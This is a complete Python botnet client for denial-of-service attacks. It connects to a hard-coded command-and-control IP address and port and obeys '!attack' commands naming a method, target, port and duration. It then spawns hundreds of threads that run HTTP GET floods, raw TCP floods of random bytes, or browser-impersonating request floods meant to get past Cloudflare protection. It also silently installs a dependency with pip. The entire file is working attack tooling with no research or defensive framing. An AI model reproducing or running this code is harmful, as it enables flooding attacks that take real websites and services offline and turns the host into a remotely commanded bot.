import socket
import time
import random
from threading import Thread
import os
import multiprocessing
host_server = "217.154.161.167"
host_port = 11951
thread77 = 700
redhot = None
timeattack = None
target = None
port = None


try:
    
    from curl_cffi import requests
    print("Done")
    
    
except Exception as e:
    print("Error",e)
    os.system("pip3 install curl_cffi")
    


def usergents():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.3124.85",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    ]

def method_http(ip, portip, timekk):
    start = time.time()
    while time.time() - start < timekk:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as jgan:
            try:
                jgan.connect((ip, portip))
                while time.time() - start < timekk:
                    jgan.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(usergents())}\r\nConnection: keep-alive\r\n\r\n'.encode())
            except Exception as e:
                hi = "hi"

def method_cloudflare(url, port, timeOs):
    session = requests.Session(impersonate="chrome124")
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": random.choice(usergents())
    }
    start = time.time()
    while time.time() - start < timeOs:
        try:
            full_url = url
            if not full_url.startswith(('http://', 'https://')):
                full_url = 'https://' + full_url
            r = session.get(full_url, headers=headers, timeout=8)
        except Exception as e:
            
            time.sleep(0.5)



def method_tcp(ip,port6,time1):
    start = time.time()
    while time.time() - start < time1:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as wlc:
            wlc.connect((ip,port6))
            while time.time() - start < time1:
                try:
                    wlc.send(random._urandom(1024))
                except Exception as e:
                    h = "hi"
                    
                
                
        


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host_server, host_port))
print("Cooncet to Server ")


while True:
    data = sock.recv(1024)
    redhot = data.decode().strip()
    v0 = redhot.split()
    if len(v0) == 5 and v0[0] == "!attack":
        method = v0[1]
        target = v0[2]
        port = int(v0[3])
        timeattack = int(v0[4])
        def execute():
            if method == "http":
                for _ in range(thread77):
                    Thread(target=method_http, args=(target, port, timeattack)).start()
            elif method == "cloudflare":
                for _ in range(thread77):
                    Thread(target=method_cloudflare, args=(target, port, timeattack)).start()
                
            elif method == "tcp":
                for _ in range(thread77):
                    Thread(target=method_tcp, args=(target, port, timeattack)).start()
                
                print("Soon")
            else:
                print("Method Not Found")

        p = multiprocessing.Process(target=execute)
        p.start()
        print("Done Start Attack")
